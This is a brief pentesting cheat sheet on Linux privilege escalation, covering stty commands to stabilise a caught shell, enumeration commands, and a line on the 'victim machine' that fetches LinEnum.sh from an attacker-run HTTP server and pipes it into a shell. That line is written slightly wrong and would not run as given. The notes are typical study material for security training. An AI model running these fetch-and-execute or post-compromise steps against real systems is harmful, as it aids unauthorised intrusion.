Linux Privilege Escalation
-------------------------- 

  Fixing a Shell <br>
  Mirror the victims machine with your kali terminal window <br>
  
  $
  stty -a  <br>
  stty raw -echo <br>
  fg <br>
  stty rows <number> columns <number> <br>
  reset <br>
  export TERM=screen <br>
  export SHELL=bash <br>
  
  Run Linux Exploit Suggester or LinEnum.sh <br>
  
  Victim Machine <br>
  wget http://10.x.x.x:1234/LinEnum.sh | Bash
  Attacker Machine <br>
  python -m SimpleHTTPServer 1234
  
  Poke at Shell
  Operating System <br>
  $ 
  id
  uname -a 
  cat /etc/issue
  cat /etc/*-release
  


